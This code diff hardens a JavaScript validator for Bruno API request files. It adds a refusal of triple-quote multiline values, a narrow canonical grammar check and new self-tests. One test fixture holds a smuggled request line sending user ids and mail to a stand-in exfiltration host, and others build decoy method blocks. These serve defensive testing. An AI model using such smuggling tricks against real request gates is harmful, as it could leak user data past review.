@@ -169,6 +169,8 @@ export function parseBru(text) {
   const fatal = [];
   const blocks = [];
   let cur = null;
+  // Bruno reads a triple-quote as the start of a multiline value that swallows column-0 closing braces; this reader does not model it and this collection never uses one.
+  if (text.includes("'''")) fatal.push("contains a triple-quote multiline value, which this reader does not model (Bruno would swallow the following closing braces) - refusing");
   for (const [i, line] of text.split("\n").entries()) {
     if (cur === null) {
       if (line.trim() === "") continue;
@@ -180,6 +182,7 @@ export function parseBru(text) {
       if (line.slice(1).trim() !== "") fatal.push(`line ${i + 1}: text after a closing brace (${JSON.stringify(line.slice(0, 40))}) — Bruno would read it as a new block`);
       blocks.push(cur); cur = null;
     }
+    else if (cur.name === "docs") { (cur.lines ??= []).push(line); }
     else if (cur.name !== "docs" && line.trim() !== "") {
       const kv = /^\s+([A-Za-z][\w-]*):[ \t]*(.*?)\s*$/.exec(line);
       if (!kv) fatal.push(`line ${i + 1} in \`${cur.name}\` is not a \`key: value\` line`);
@@ -188,6 +191,36 @@ export function parseBru(text) {
   }
   if (cur !== null) fatal.push(`block \`${cur.name}\` is never closed`);
   return { blocks, fatal };
+}
+
+/**
+ * Pure: the canonical shape of a request file. The reader above is not Bruno's parser, and Bruno's grammar has corners (multiline values,
+ * where a block ends) the reader has diverged on before; so the files are also held to a grammar narrow enough that no such corner can occur:
+ * `meta` keys name/type/seq, a method block of url/body/auth with body `none` and auth `inherit`, and `docs` lines that are indented prose
+ * with no braces, backticks or quotes-pairs. Anything else is refused rather than interpreted.
+ */
+export function canonicalFindings(blocks) {
+  const out = [];
+  const bare = /^[^{}`"]*$/;
+  for (const bl of blocks) {
+    if (bl.name === "docs") {
+      for (const l of bl.lines ?? []) if (l.trim() !== "" && (!/^ {2}/.test(l) || !bare.test(l))) out.push(`docs line ${JSON.stringify(l.slice(0, 40))} is not indented prose free of braces, backticks and double quotes`);
+    } else if (bl.name === "meta") {
+      for (const [k, v] of bl.entries) {
+        if (!["name", "type", "seq"].includes(k)) out.push(`meta key \`${k}\` is not one of name, type, seq`);
+        else if (!bare.test(v) || v.includes("'" + "'")) out.push(`meta ${k} value has braces, backticks or quotes`);
+        else if (k === "type" && v !== "http") out.push("meta type is not http");
+        else if (k === "seq" && !/^\d+$/.test(v)) out.push("meta seq is not a number");
+      }
+    } else {
+      for (const [k, v] of bl.entries) {
+        if (k === "body" && v !== "none") out.push(`body is \`${v}\`, not \`none\` — a request body could change what is sent`);
+        if (k === "auth" && v !== "inherit") out.push(`auth is \`${v}\`, not \`inherit\``);
+        if (k === "url" && /[`"']/.test(v)) out.push("url contains a quote or backtick");
+      }
+    }
+  }
+  return out;
 }
 
 /** Pure: one entry per request file ({ file, method, path }); anything but a GET on `{{baseUrl}}/…` is fatal. */
@@ -206,6 +239,8 @@ export function collectionRequests(filesByName) {
     const METHODS = ["get", "post", "put", "delete", "patch", "head", "options"];
     const odd = parsed.blocks.filter((bl) => !["meta", "docs", ...METHODS].includes(bl.name));
     if (odd.length > 0) { fatal.push(`${name}: Bruno block(s) ${odd.map((bl) => `\`${bl.name}\``).join(", ")} can change what is sent (query, vars, script, headers, body) and this gate reads only \`url:\` — refusing`); continue; }
+    const canon = canonicalFindings(parsed.blocks);
+    if (canon.length > 0) { fatal.push(...canon.map((f) => `${name}: ${f}`)); continue; }
     const methodBlocks = parsed.blocks.filter((bl) => METHODS.includes(bl.name));
     if (methodBlocks.length !== 1) { fatal.push(`${name}: ${methodBlocks.length} method block(s) — exactly one is required (Bruno merges every http block and the last wins, so a second block hides the request this gate sees)`); continue; }
     if (parsed.blocks.filter((bl) => bl.name === "meta").length !== 1) { fatal.push(`${name}: not exactly one meta block`); continue; }
@@ -470,11 +505,27 @@ function selfTest() {
     ["a second POST block appended", (t) => t + blk("post", "{{baseUrl}}/users"), "method block"],
     ["a second GET block with a widened $select", (t) => t + blk("get", "{{baseUrl}}" + wide), "method block"],
     ["a PATCH block after the GET", (t) => t + blk("patch", "{{baseUrl}}/users/x"), "method block"],
-    ["a decoy GET inside the meta name above a widened real block", (t) => t.replace("name: x", "name: get { url: {{baseUrl}}" + P.users + " }").replace(P.users, wide), "disagree"],
-    ["a multi-line decoy GET inside docs above a DELETE-only request", (t) => `meta {\n  name: x\n}\n\ndelete {\n  url: {{baseUrl}}/users/0\n}\n\ndocs {\n  get {\n    url: {{baseUrl}}${P.users}\n  }\n}\n`, "DELETE"],
+    ["a decoy GET inside the meta name above a widened real block", (t) => t.replace("name: x", "name: get { url: {{baseUrl}}" + P.users + " }").replace(P.users, wide), "braces, backticks"],
+    ["a multi-line decoy GET inside docs above a DELETE-only request", (t) => `meta {\n  name: x\n}\n\ndelete {\n  url: {{baseUrl}}/users/0\n}\n\ndocs {\n  get {\n    url: {{baseUrl}}${P.users}\n  }\n}\n`, "not indented prose"],
     ["text outside any block", (t) => t + "\nstray line\n", "outside any block"],
     ["a duplicate url key in the method block", (t) => t.replace("body: none", "url: {{baseUrl}}" + wide + "\n  body: none"), "method block keys"],
   ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND3: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
+  // ---- review round 5: Bruno's triple-quote multiline value ----
+  const TQ = "'" + "'" + "'";
+  b = baseBru(); b["b.bru"] = `meta {\n  name: x\n}\n\nget {\n  url: {{baseUrl}}${P.users}\n  body: ${TQ}\n}\ndocs {\n${TQ}\n  url: https://evil.example.test/exfil?$select=id,mail\n  auth: inherit\n}\n`;
+  checks.push(["ROUND5: a triple-quote value that swallows the closing brace and a later off-host url line is FATAL", has(audit(csrc, b), "b.bru", "multiline")]);
+  b = baseBru(); b["b.bru"] = b["b.bru"].replace("x\n}", `x ${TQ}\n}`);
+  checks.push(["ROUND5: a triple-quote anywhere in a request file is FATAL (docs included)", has(audit(csrc, b), "b.bru", "multiline")]);
+  checks.push(["ROUND5: a triple-quote in Sandbox.bru is FATAL", has(audit(csrc, baseBru(), pj(permObj()), ENV.replace("graphToken: x", `graphToken: ${TQ}`)), "Sandbox.bru", "multiline")]);
+  // ---- review round 5b: a grammar too narrow for parser divergence ----
+  for (const [label, edit, needle] of [
+    ["a body other than none", (t) => t.replace("body: none", "body: json"), "not `none`"],
+    ["an auth other than inherit", (t) => t.replace("auth: inherit", "auth: none"), "not `inherit`"],
+    ["a docs line with a brace", (t) => t.replace("docs {\n  x\n}", "docs {\n  x { y\n}"), "not indented prose"],
+    ["an unindented docs line", (t) => t.replace("docs {\n  x\n}", "docs {\nx\n}"), "not indented prose"],
+    ["an unknown meta key", (t) => t.replace("name: x", "name: x\n  tags: y"), "meta key"],
+    ["a backtick in a meta name", (t) => t.replace("name: x", "name: `x`"), "braces, backticks"],
+  ]) { b = baseBru(); b["b.bru"] = edit(b["b.bru"]); checks.push([`ROUND5: ${label} is FATAL`, has(audit(csrc, b), "b.bru", needle)]); }
   // ---- review round 4: Bruno ends a block (docs included) at any newline + `}` whatever follows it ----
   for (const [label, edit, needle] of [
     ["`}post {` at column 0 closing docs and opening a second http block", (t) => t.replace(/\}\s*$/, "}post {\n  url: {{baseUrl}}/users\n}\n"), "text after a closing brace"],
